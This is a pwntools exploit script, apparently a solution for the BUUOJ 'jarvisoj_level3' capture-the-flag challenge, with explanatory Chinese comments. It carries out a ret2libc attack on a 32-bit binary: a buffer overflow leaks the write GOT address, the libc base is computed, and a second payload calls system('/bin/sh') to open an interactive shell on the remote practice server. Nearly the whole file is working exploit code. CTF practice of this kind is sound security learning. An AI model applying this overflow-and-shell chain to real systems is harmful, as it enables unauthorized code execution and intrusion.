'''
@Author       : 白银
@Date         : 2023-04-21 14:10:32
@LastEditors  : 白银
@LastEditTime : 2023-04-21 14:36:09
@FilePath     : /pwn/level3.py
@Description  : https://buuoj.cn/challenges#jarvisoj_level3
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './level3'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 26305)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        # libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        # libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    # libc = elf.libc
    libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x8c # ida看，buf和r差多少
write_plt = elf.plt['write']
print("write_plt------", hex(write_plt))
write_got = elf.got['write']
print("write_got------", hex(write_got))
return_addr = elf.symbols['main']
print("return_addr------", hex(return_addr))
# return_addr = 0x804844b

# 1 是文件描述符，表示标准输出
# write_got在write函数内部被解释为输出的数据的地址；
# 4 是要写入到标准输出的字节数
# ssize_t write(int fd, const void *buf, size_t count); //这是write函数
# ssize_t write(1, write_got, 4); //这是payload的布局
# 利用write()函数向输出流中写入数据，在这个过程中泄露出libc基址
payload = flat(['a' * padding , write_plt, return_addr, 1, write_got, 4])
io.recvuntil("Input:\n")
io.sendline(payload)

write_addr = u32(io.recv(4))# x86一个指针占4字节
print("write_addr------", hex(write_addr))
    
# libc = finder('write', write_addr)
# libc_base = write_addr - libc.dump('write')
# system_addr = libc_base + libc.dump('system')
# bin_sh_addr = libc_base + libc.dump('str_bin_sh')

libc_base = write_addr - libc.symbols['write']
print("libc_base------", hex(libc_base))
system_addr = libc_base + libc.symbols['system']
print("system_addr------", hex(system_addr))
bin_sh_addr = libc_base + libc.search(b'/bin/sh').__next__()
print("bin_sh_addr------", hex(bin_sh_addr))

payload2 = flat(['a' * padding, system_addr, 0xdeadbeef, bin_sh_addr]) # x86在函数和参数之间要占位符

# sleep(1)
io.sendlineafter('Input:\n', payload2)

io.interactive()
